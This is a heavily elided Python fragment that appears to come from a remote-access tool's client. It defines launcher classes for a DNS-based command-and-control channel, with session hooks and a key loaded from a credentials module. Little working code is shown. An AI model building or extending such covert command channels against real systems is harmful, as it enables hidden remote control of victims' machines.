...
class DNSCommandClientLauncher(DnsCommandsClient):
    def __init__(self, domain, doh=False, ns=None, qtype=None, ns_timeout=3):
        ...
        try:
            ...
            key = ghost_credentials.DNSCNC_PUB_KEY_V2
        except ImportError:
    ...
    def on_session_established(self):
        ghost.client.set_info('spi', '{:08x}'.format(self.spi))

    def on_session_lost(self):
        ghost.client.unset_info('spi')
...
class DNSCncLauncher(BaseLauncher):
    ...
    def iterate(self):
        ...
        while not self.exited and not ghost.client.terminated:
            try:
